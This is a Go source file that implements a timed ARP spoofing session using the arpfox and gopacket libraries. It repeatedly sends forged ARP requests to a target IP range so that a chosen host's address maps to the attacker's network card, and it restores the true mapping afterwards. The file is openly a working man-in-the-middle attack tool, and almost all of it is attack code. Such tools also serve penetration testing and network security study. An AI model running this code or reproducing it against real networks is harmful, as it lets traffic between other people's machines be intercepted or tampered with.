package networking

import (
	"bytes"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"
	"log"
	"net"
	"time"
)

type arpfoxConn struct {
	interfaceName string
	targetIP      string
	hostIP        string
	waitInterval  float64
	timer         time.Duration
}

func NewArpfoxConn(interfaceName string, waitInterval float64, targetIP string, hostIP string, timer time.Duration) *arpfoxConn {
	afConn := new(arpfoxConn)
	afConn.hostIP = hostIP
	afConn.interfaceName = interfaceName
	afConn.targetIP = targetIP
	afConn.waitInterval = waitInterval
	afConn.timer = timer
	return afConn
}

func list_intefaces_list() {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Println("Failed to retrieve interfaces: ", err)
	}
	for _, iface := range ifaces {
		if iface.HardwareAddr == nil {
			continue
		}
		fmt.Printf("%s \"%s\"\n", iface.HardwareAddr, iface.Name)
	}
}

func getInterface(arpConn arpfoxConn) (*net.Interface, error) {
	iface, err := net.InterfaceByName(arpConn.interfaceName)
	iface.Name, err = getActualDeviceName(iface)
	if err != nil {
		log.Println("could not translate device Name: ", err)
	}
	return iface, err
}

func getHandler(iface *net.Interface) (*pcap.Handle, error) {
	handler, err := pcap.OpenLive(iface.Name, 65535, true, pcap.BlockForever)
	return handler, err
}

func getInterfaceAddress(iface *net.Interface) (*net.IPNet, error) {
	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()

	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}

	return ifaceAddr, err
}

func getTargetAddrs(arpConn arpfoxConn) ([]net.IP, error) {
	var targetAddrs []net.IP
	if arpConn.targetIP != "" {
		addrRange, err := iprange.ParseList(arpConn.targetIP)
		targetAddrs = addrRange.Expand()
		return targetAddrs, err

	}
	return targetAddrs, nil

}

func Start_spoofing_session(arpConn arpfoxConn) {

	iface, err := getInterface(arpConn)
	if err != nil {
		log.Println("Could not use interface %s: %v", arpConn.interfaceName, err)
	}

	handler, err := getHandler(iface)
	if err != nil {
		log.Println(err)
	}
	defer handler.Close()

	ifaceAddr, err := getInterfaceAddress(iface)
	if err != nil {
		log.Println(err)
	}
	if ifaceAddr == nil {
		log.Println("Could not get interface address.")
	}

	targetAddrs, err := getTargetAddrs(arpConn)
	if err != nil {
		log.Println("Wrong format for target.")
	}
	if len(targetAddrs) == 0 {
		log.Println("No valid targets given.")
	}

	ParsedHostIP := net.ParseIP(arpConn.hostIP)
	if ParsedHostIP == nil {
		log.Println("Wrong format for host IP.")
	}
	ParsedHostIP = ParsedHostIP.To4()

	stop := make(chan struct{}, 2)
	arpTimer := time.NewTimer(time.Second * arpConn.timer)
	defer arpTimer.Stop()
	go func(timer time.Duration) {
		<-arpTimer.C
		fmt.Println("%d Seconds timer ended", timer)
		close(stop)

	}(arpConn.timer)

	go readARP(handler, stop, iface)

	// Get original source
	origSrc, err := arp.Lookup(ParsedHostIP)
	if err != nil {
		log.Println("Unable to lookup hw address for %s: %v", ParsedHostIP, err)
	}

	fakeSrc := arp.Address{
		IP:           ParsedHostIP,
		HardwareAddr: iface.HardwareAddr,
	}

	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(arpConn.waitInterval*1000.0)*time.Millisecond)

	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

}

func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	log.Printf("Cleaning up and re-ARPing targets...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})

	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:
				<-t.C
				for _, ip := range targetAddrs {
					arpAddr, err := arp.Lookup(ip)
					if err != nil {
						log.Printf("Could not retrieve %v's MAC address: %v", ip, err)
						continue
					}
					dst := &arp.Address{
						IP:           ip,
						HardwareAddr: arpAddr.HardwareAddr,
					}

					buf, err := arp.NewARPRequest(src, dst)
					if err != nil {
						log.Print("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						log.Print("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)

	return stoppedWriting
}

func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			log.Printf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation, net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress), net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}

// getActualDeviceName returns the underlying network card Name.
// Actual Windows network card names look like:
// "\Device\NPF_{8D51979B-6048-4472-BBA9-379CF7C7A339}"
func getActualDeviceName(iface *net.Interface) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", err
	}

	for _, data := range devices {
		for i := range addrs {
			for j := range data.Addresses {
				if data.Addresses[j].IP.To4() == nil {
					continue
				}
				if addrs[i].(*net.IPNet).Contains(data.Addresses[j].IP) {
					return data.Name, nil
				}
			}
		}
	}

	return "", fmt.Errorf("could not find a network card that matches the interface")
}
